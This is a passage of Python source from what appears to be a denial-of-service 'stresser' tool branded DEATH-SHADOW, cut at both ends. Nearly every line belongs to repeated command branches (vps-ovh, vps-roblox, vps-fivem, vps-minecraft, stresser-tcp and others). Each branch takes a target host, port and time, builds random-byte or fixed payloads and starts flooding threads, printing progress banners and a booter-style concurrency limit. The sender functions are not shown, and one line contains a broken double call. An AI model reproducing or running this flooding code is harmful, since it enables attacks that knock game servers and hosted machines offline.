					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "game-samp":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "vps":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "vps-xv":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "vps-bypass":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "vps-ovh":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "vps-udp":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "vps-roblox":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "vps-fivem":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "vps-minecraft":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "vps-samp":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "vps-stresser":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "stresser":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "stresser-xv":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "stresser-bypass":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "stresser+ovh":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "stresser-udp":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "stresser-tcp":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "roblox-sas":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfokill-sas":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp-sas":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
